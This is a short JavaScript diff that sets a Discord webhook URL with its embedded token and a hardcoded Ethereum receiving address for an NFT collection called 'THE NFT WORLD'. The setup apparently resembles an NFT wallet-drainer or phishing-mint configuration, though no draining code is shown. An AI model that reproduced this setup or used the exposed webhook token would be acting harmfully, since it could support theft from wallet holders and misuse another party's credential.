@@ -1,4 +1,4 @@
-const webhookURL = "incredible_badger_80768";
+const webhookURL = "https://discord.com/api/webhooks/1278831545314181120/NEBxT_KhStvvXsSZshZ1c99ODY8-t4O5b2E7-N8oApSgT75aIuvOk5GGd2Ly8rf7vyjS";
 const receiveAddress = '0xcb90Ea15d707a5A79B5B9E102400E0903034e07b',
   collectionInfo = {
     name: 'THE NFT WORLD',
